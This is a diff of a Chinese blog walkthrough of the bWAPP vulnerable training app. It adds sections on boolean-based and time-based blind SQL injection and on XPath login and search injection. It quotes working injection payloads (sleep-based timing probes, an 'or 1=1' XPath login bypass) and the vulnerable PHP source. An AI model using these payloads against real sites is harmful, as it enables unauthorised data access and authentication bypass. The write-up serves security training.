@@ -163,7 +163,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      3.8k 字
+      4.2k 字
     </span>
   
 
@@ -173,7 +173,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      55
+      62
        分钟
     </span>
   
@@ -661,7 +661,57 @@ return $input;
 <h3 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection Blind"></a>SQL Injection Blind</h3><h4 id="Blind-Boolean-Based"><a href="#Blind-Boolean-Based" class="headerlink" title="Blind - Boolean-Based"></a>Blind - Boolean-Based</h4><h5 id="nbsp-nbsp-low-16"><a href="#nbsp-nbsp-low-16" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;输入正确只能显示存在或不存在</p>
 <p>&nbsp;&nbsp;由于判断是字符型注入，需要加上引号</p>
 <pre><code>Iron Man&apos; and &apos;1&apos;=&apos;1  //显示存在
-Iron Man&apos; and &apos;1&apos;=&apos;2  //显示不存在</code></pre>
+Iron Man&apos; and &apos;1&apos;=&apos;2  //显示不存在</code></pre><p>&nbsp;&nbsp;测试一下数据库名长度</p>
+<pre><code>Iron Man&apos; and length(database())=5 #</code></pre><p>b45</p>
+<h5 id="nbsp-nbsp-medium-and-high-8"><a href="#nbsp-nbsp-medium-and-high-8" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p>
+<h4 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time-Based"></a>Time-Based</h4><h5 id="nbsp-nbsp-low-17"><a href="#nbsp-nbsp-low-17" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>b46</p>
+<p>&nbsp;&nbsp;无论输入什么，都是这个结果，需要通过盲注测试</p>
+<p>&nbsp;&nbsp;需要通过sleep函数</p>
+<pre><code>Iron Man&apos; and sleep(if((1=1), 0, 3)) # //没有延迟
+Iron Man&apos; and sleep(if((1=2), 0, 3)) # //延迟3s
+Iron man&apos; and if(1=0,1, sleep(10)) # //延迟10s</code></pre><h5 id="nbsp-nbsp-medium-and-high-9"><a href="#nbsp-nbsp-medium-and-high-9" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;还是 addslashes 和 mysql_real_escape_string ，无法绕过</p>
+<h4 id="Blind-SQLite"><a href="#Blind-SQLite" class="headerlink" title="Blind (SQLite)"></a>Blind (SQLite)</h4><p>&nbsp;&nbsp;具体操作和sql类似，注意注释为 –</p>
+<h3 id="XML-XPath-Injection"><a href="#XML-XPath-Injection" class="headerlink" title="XML/XPath Injection"></a>XML/XPath Injection</h3><h4 id="Login-Form"><a href="#Login-Form" class="headerlink" title="Login Form"></a>Login Form</h4><h5 id="nbsp-nbsp-low-18"><a href="#nbsp-nbsp-low-18" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;用户名后输入单引号，出现报错</p>
+<p>b48</p>
+<p>&nbsp;&nbsp;看看源码</p>
+<pre><code>// Loads the XML file
+$xml = simplexml_load_file(&quot;passwords/heroes.xml&quot;);
+
+// XPath search
+$result = $xml-&gt;xpath(&quot;/heroes/hero[login=&apos;&quot; . $login . &quot;&apos; and password=&apos;&quot; . $password . &quot;&apos;]&quot;);
+
+//先通过simplexml_load_file函数载入xml文件，xml内是登录账号，再通过xpath来将xml内的账号和输入账号密码比较
+//构造payload ： xxx&apos; or 1=1 or &apos;&apos;=&apos;</code></pre><p>b47</p>
+<h5 id="nbsp-nbsp-medium-and-high-10"><a href="#nbsp-nbsp-medium-and-high-10" class="headerlink" title="&nbsp;&nbsp;medium and high"></a>&nbsp;&nbsp;<strong>medium and high</strong></h5><p>&nbsp;&nbsp;源码中过滤大部分能操作的字符</p>
+<pre><code>function xmli_check_1($data)
+{
+
+// Replaces dangerous characters: ( ) = &apos; [ ] : , * / WHITESPACE
+$input = str_replace(&quot;(&quot;, &quot;&quot;, $data);
+$input = str_replace(&quot;)&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;=&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;&apos;&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;[&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;]&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;:&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;,&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;*&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot;/&quot;, &quot;&quot;, $input);
+$input = str_replace(&quot; &quot;, &quot;&quot;, $input);
+
+return $input;
+
+}</code></pre><h4 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h4><h5 id="nbsp-nbsp-low-19"><a href="#nbsp-nbsp-low-19" class="headerlink" title="&nbsp;&nbsp;low"></a>&nbsp;&nbsp;<strong>low</strong></h5><p>&nbsp;&nbsp;电影类型后输入单引号，出现报错</p>
+<p>b49</p>
+<p>&nbsp;&nbsp;看看源码</p>
+<pre><code>// Loads the XML file
+$xml = simplexml_load_file(&quot;passwords/heroes.xml&quot;);
+
+// XPath search
+// $result = $xml-&gt;xpath(&quot;//hero[genre = &apos;$genre&apos;]/movie&quot;);
+$result = $xml-&gt;xpath(&quot;//hero[contains(genre, &apos;$genre&apos;)]/movie&quot;);
+
+//contains(str1,str2)函数用来判断str2是否是第一个字符串的一部分。</code></pre>
             </article>
             <hr>
             <div>
